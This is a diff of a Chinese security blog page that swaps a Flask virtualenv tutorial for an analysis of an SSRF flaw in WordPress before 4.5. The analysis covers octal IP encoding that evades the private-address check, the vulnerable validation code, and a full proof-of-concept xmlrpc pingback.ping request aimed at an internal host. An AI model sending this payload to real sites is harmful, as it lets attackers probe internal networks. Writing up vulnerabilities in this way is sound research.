@@ -3,21 +3,35 @@
 <head>
   <meta charset="utf-8">
   
-  <title>flask virtualenv环境搭建 | 0kami&#39;s Blog</title>
+  <title>wordpress SSRF &lt;4.5 漏洞分析 | 0kami&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="引言　　python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。
-安装virtualenv　　这里我推荐使用pip或者easy_install安装，同样也可以通过下载virtualenv.py来构建虚拟环境。　　使用pi">
+  <meta name="description" content="概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。
+ip地址的几种表示方式ip地址域名有多种表示方式，浏览器都能识别出来。
+
+常见的ip地址域名表示方法
+点分十进制表示法，例如192.168.1.2
+二进制表示法例如11000000101010000000000100000">
 <meta property="og:type" content="article">
-<meta property="og:title" content="flask virtualenv环境搭建">
-<meta property="og:url" content="http://yoursite.com/2016/03/16/flask-virtualenv/index.html">
+<meta property="og:title" content="wordpress SSRF <4.5 漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2016/08/19/wordpress-ssrf-4-4-2/index.html">
 <meta property="og:site_name" content="0kami's Blog">
-<meta property="og:description" content="引言　　python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。
-安装virtualenv　　这里我推荐使用pip或者easy_install安装，同样也可以通过下载virtualenv.py来构建虚拟环境。　　使用pi">
-<meta property="og:updated_time" content="2016-08-19T07:33:12.333Z">
+<meta property="og:description" content="概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。
+ip地址的几种表示方式ip地址域名有多种表示方式，浏览器都能识别出来。
+
+常见的ip地址域名表示方法
+点分十进制表示法，例如192.168.1.2
+二进制表示法例如11000000101010000000000100000">
+<meta property="og:image" content="http://blog.0kami.cn/img/wordpress-ssrf.png">
+<meta property="og:updated_time" content="2016-08-19T09:53:34.922Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="flask virtualenv环境搭建">
-<meta name="twitter:description" content="引言　　python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。
-安装virtualenv　　这里我推荐使用pip或者easy_install安装，同样也可以通过下载virtualenv.py来构建虚拟环境。　　使用pi">
+<meta name="twitter:title" content="wordpress SSRF <4.5 漏洞分析">
+<meta name="twitter:description" content="概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。
+ip地址的几种表示方式ip地址域名有多种表示方式，浏览器都能识别出来。
+
+常见的ip地址域名表示方法
+点分十进制表示法，例如192.168.1.2
+二进制表示法例如11000000101010000000000100000">
+<meta name="twitter:image" content="http://blog.0kami.cn/img/wordpress-ssrf.png">
   
     <link rel="alternative" href="/atom.xml" title="0kami&#39;s Blog" type="application/atom+xml">
   
@@ -223,11 +237,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-flask-virtualenv" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-wordpress-ssrf-4-4-2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/03/16/flask-virtualenv/" class="article-date">
-      <time datetime="2016-03-16T13:36:08.000Z" itemprop="datePublished">2016-03-16</time>
+      <a href="/2016/08/19/wordpress-ssrf-4-4-2/" class="article-date">
+      <time datetime="2016-08-19T07:05:19.000Z" itemprop="datePublished">2016-08-19</time>
 </a>
     </div>
   
@@ -240,7 +254,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      flask virtualenv环境搭建
+      wordpress SSRF &lt;4.5 漏洞分析
     </h1>
   
 
@@ -249,13 +263,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/python/">python</a>
+    <a class="article-category-link" href="/categories/webSec/">webSec</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/flask/">flask</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webVul/">webVul</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -265,13 +279,30 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>　　python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。</p>
-<h2 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h2><p>　　这里我推荐使用pip或者easy_install安装，同样也可以通过下载<a href="https://pypi.python.org/pypi/virtualenv" target="_blank" rel="external">virtualenv.py</a>来构建虚拟环境。<br>　　使用pip命令 <code>pip install virtualenv</code></p>
-<h2 id="建立环境"><a href="#建立环境" class="headerlink" title="建立环境"></a>建立环境</h2><p>　　首先进入网站的根目录（或者是任何需要建立虚拟环境的文件夹下）<br>　　使用dos命令 <code>virtualenv venv</code> 其中venv为python的虚拟环境，其中包括了python.exe、pip、easy_install等python环境。</p>
-<h2 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h2><p>　　完成上一步后，接下来需要在dos界面激活虚拟环境，这样可以使得接下来下载的python模块都位于venv下的pip环境中<br><code>Scripts\activate   激活虚拟环境</code><br><code>deactivate  退出虚拟环境</code><br>　　激活后命令行开头多了（venv），如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\code\python-workplace\flasker\venv&gt;Scripts\activate</span><br><span class="line">(venv) E:\code\python-workplace\flasker\venv&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>　　在上面的基础下，通过<code>pip install xxxx</code>安装的模块都是安装在venv环境下的，对主机上的环境没有影响。</p>
-<h2 id="引入路径"><a href="#引入路径" class="headerlink" title="引入路径"></a>引入路径</h2><p>　　在具体使用过程中，需要把venv的路径导入sys.path，这样才可以使用虚拟环境中的python模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">importos,sys</span><br><span class="line">sys.path.append(os.getcwd()+<span class="string">'\\venv\\Lib\\site-packages'</span>)</span><br></pre></td></tr></table></figure></p>
-<p>　　到这里就完成了python虚拟环境的搭建，总体对经常变动编程环境的城旭猿来说这是个非常有用功能。<br>　　<strong>==The End==</strong></p>
+        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。</p>
+<h2 id="ip地址的几种表示方式"><a href="#ip地址的几种表示方式" class="headerlink" title="ip地址的几种表示方式"></a>ip地址的几种表示方式</h2><p>ip地址域名有多种表示方式，浏览器都能识别出来。</p>
+<ol>
+<li>常见的ip地址域名表示方法<br><ul>
+<li>点分十进制表示法，例如192.168.1.2<br></li>
+<li>二进制表示法例如11000000101010000000000100000010，表示192.168.1.2</li>
+</ul>
+</li>
+<li>非常见ip地址域名表示方法<br><ul>
+<li>整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问<a href="http://3232235778" target="_blank" rel="external">http://3232235778</a> 解析为192.168.1.2，除此之外还可以通过公式<code>192*256^3+168*256^2+1*256+2=3232235778</code>换算<br></li>
+<li>八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制<br></li>
+<li>十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制<br></li>
+<li>混合型：即以上的几种方式的结合，0300.0xA8.1.0x02<br></li>
+</ul>
+</li>
+</ol>
+<p>下面就是通过八进制绕过检测。</p>
+<h2 id="代码详情"><a href="#代码详情" class="headerlink" title="代码详情"></a>代码详情</h2><p>漏洞成因处508 <code>wp_http_validate_url</code> 函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( ! $same_host ) &#123;</span><br><span class="line">		$host = trim( $parsed_url[<span class="string">'host'</span>], <span class="string">'.'</span> );</span><br><span class="line">		<span class="keyword">if</span> ( preg_match( <span class="string">'#^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$#'</span>, $host ) ) &#123;</span><br><span class="line">			$ip = $host;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ip = gethostbyname( $host );</span><br><span class="line">			<span class="keyword">if</span> ( $ip === $host ) <span class="comment">// Error condition for gethostbyname()</span></span><br><span class="line">				$ip = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ( $ip ) &#123;</span><br><span class="line">			$parts = array_map( <span class="string">'intval'</span>, explode( <span class="string">'.'</span>, $ip ) );</span><br><span class="line">			<span class="keyword">if</span> ( <span class="number">127</span> === $parts[<span class="number">0</span>] || <span class="number">10</span> === $parts[<span class="number">0</span>] || <span class="number">0</span> === $parts[<span class="number">0</span>]</span><br><span class="line">				|| ( <span class="number">172</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">16</span> &lt;= $parts[<span class="number">1</span>] &amp;&amp; <span class="number">31</span> &gt;= $parts[<span class="number">1</span>] )</span><br><span class="line">				|| ( <span class="number">192</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">168</span> === $parts[<span class="number">1</span>] )</span><br><span class="line">			) &#123;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure></p>
+<p>这里的代码通过正则表达式<code>^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$</code>判断ip是否合法，如果不合法则通过网络获取ip的值。<br><br>下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $parsed_url[<span class="string">'port'</span>] ) )</span><br><span class="line">		<span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">	$port = $parsed_url[<span class="string">'port'</span>];</span><br><span class="line">	<span class="keyword">if</span> ( <span class="number">80</span> === $port || <span class="number">443</span> === $port || <span class="number">8080</span> === $port )</span><br><span class="line">		<span class="keyword">return</span> $url;</span><br></pre></td></tr></table></figure></p>
+<p>再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。<br><br>综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080<br><br>找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。<br>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这里设置10.10.10.111为受害者<br><img src="http://blog.0kami.cn/img/wordpress-ssrf.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）<br>还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="external">http://xlab.baidu.com/wordpress/</a><br><a href="https://virusdefender.net/index.php/archives/733/" target="_blank" rel="external">https://virusdefender.net/index.php/archives/733/</a></p>
 
       
     </div>
@@ -280,13 +311,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/03/16/flask-virtualenv/">flask virtualenv环境搭建</a></p>
+        <p><span>本文标题:</span><a href="/2016/08/19/wordpress-ssrf-4-4-2/">wordpress SSRF &lt;4.5 漏洞分析</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 0kami-zj9s 的个人博客">0kami-zj9s</a></p>
-        <p><span>发布时间:</span>2016年03月16日 - 21时36分</p>
-        <p><span>最后更新:</span>2016年08月19日 - 15时33分</p>
+        <p><span>发布时间:</span>2016年08月19日 - 15时05分</p>
+        <p><span>最后更新:</span>2016年08月19日 - 17时53分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/03/16/flask-virtualenv/" title="flask virtualenv环境搭建">http://yoursite.com/2016/03/16/flask-virtualenv/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/03/16/flask-virtualenv/　　作者: 0kami-zj9s" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2016/08/19/wordpress-ssrf-4-4-2/" title="wordpress SSRF &lt;4.5 漏洞分析">http://yoursite.com/2016/08/19/wordpress-ssrf-4-4-2/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/08/19/wordpress-ssrf-4-4-2/　　作者: 0kami-zj9s" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -299,15 +330,11 @@
 
 <nav id="article-nav">
   
-    <a href="/2016/03/17/DOM-XSS/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          DOM XSS
-        
-      </div>
-    </a>
   
+    <a href="/2016/07/04/file-upload-vul/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件上传学习总结</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
   
 </nav>
 
@@ -316,7 +343,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引言"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装virtualenv"><span class="toc-number">2.</span> <span class="toc-text">安装virtualenv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#建立环境"><span class="toc-number">3.</span> <span class="toc-text">建立环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#激活环境"><span class="toc-number">4.</span> <span class="toc-text">激活环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装模块"><span class="toc-number">5.</span> <span class="toc-text">安装模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#引入路径"><span class="toc-number">6.</span> <span class="toc-text">引入路径</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip地址的几种表示方式"><span class="toc-number">2.</span> <span class="toc-text">ip地址的几种表示方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码详情"><span class="toc-number">3.</span> <span class="toc-text">代码详情</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -364,7 +391,7 @@
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="2016/03/16/flask-virtualenv/" data-title="flask virtualenv环境搭建" data-url="http://yoursite.com/2016/03/16/flask-virtualenv/"></div>
+    <div class="ds-thread" data-thread-key="2016/08/19/wordpress-ssrf-4-4-2/" data-title="wordpress SSRF &lt;4.5 漏洞分析" data-url="http://yoursite.com/2016/08/19/wordpress-ssrf-4-4-2/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -387,13 +414,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/03/17/DOM-XSS/" title="上一篇: DOM XSS">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2016/07/04/file-upload-vul/" title="下一篇: 文件上传学习总结">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
     <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/08/19/wordpress-ssrf-4-4-2/">wordpress SSRF <4.5 漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/file-upload-vul/">文件上传学习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/28/xxe/">XML External Entity(XXE)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/20/Bctf-Crypto-SpecialRSA-writeup/">Bctf Crypto SpecialRSA writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/DOM-XSS/">DOM XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/16/flask-virtualenv/">flask virtualenv环境搭建</a></li></ul>
